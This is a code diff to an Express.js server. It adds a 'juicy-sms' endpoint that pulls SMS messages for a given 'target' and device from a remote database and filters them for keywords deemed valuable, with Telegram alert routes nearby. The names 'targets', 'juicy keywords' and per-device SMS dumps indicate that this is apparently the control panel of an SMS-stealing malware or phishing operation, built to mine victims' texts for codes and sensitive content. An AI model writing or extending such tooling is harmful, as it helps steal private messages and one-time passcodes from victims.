@@ -1680,6 +1680,39 @@ app.get('/api/telegram/alerts/:urlSet', validateUrlSet, (req, res) => {
   res.json(alertStore.alerts[req.params.urlSet] || {});
 });
 
+// ── Juicy SMS: return only SMS messages that match active juicy keywords ───────
+app.get('/api/url/:id/device/:deviceId/juicy-sms', async (req, res) => {
+  const id = parseInt(req.params.id);
+  const deviceId = req.params.deviceId;
+  const mode = req.query.mode || 'new';
+  const pool = mode === 'old' ? OLD_TARGETS : mode === 'pp' ? PP_TARGETS : TARGETS;
+  const target = pool.find(t => t.id === id) || [...TARGETS, ...OLD_TARGETS, ...PP_TARGETS].find(t => t.id === id);
+  if (!target) return res.status(404).json({ error: 'URL not found' });
+  const db = getTargetDb(target);
+  const dev = db[deviceId];
+  if (!dev) return res.status(404).json({ error: 'Device not found' });
+
+  const activeKws = JUICY_KEYWORDS; // current editable list
+  const fetchUrl = getSmsLink(target, deviceId, dev.obj_id).replace('?print=pretty', '');
+  try {
+    const smsData = await fbFetch(fetchUrl);
+    const hits = [];
+    for (const msg of iterMsgs(smsData)) {
+      const body = String(msg.body || msg.message || msg.msg || msg.text || '');
+      if (!body) continue;
+      const lower = body.toLowerCase();
+      const matched = activeKws.filter(kw => lower.includes(kw));
+      if (matched.length) {
+        hits.push({ body, matchedKeywords: matched });
+        if (hits.length >= 200) break;
+      }
+    }
+    res.json({ hits, total: hits.length, keywords: activeKws });
+  } catch (e) {
+    res.json({ hits: [], total: 0, error: e.message });
+  }
+});
+
 // ── Notifications: get recent alert log ──────────────────────────────────────
 app.get('/api/notifications', (req, res) => {
   const limit = Math.min(parseInt(req.query.limit) || 50, 200);
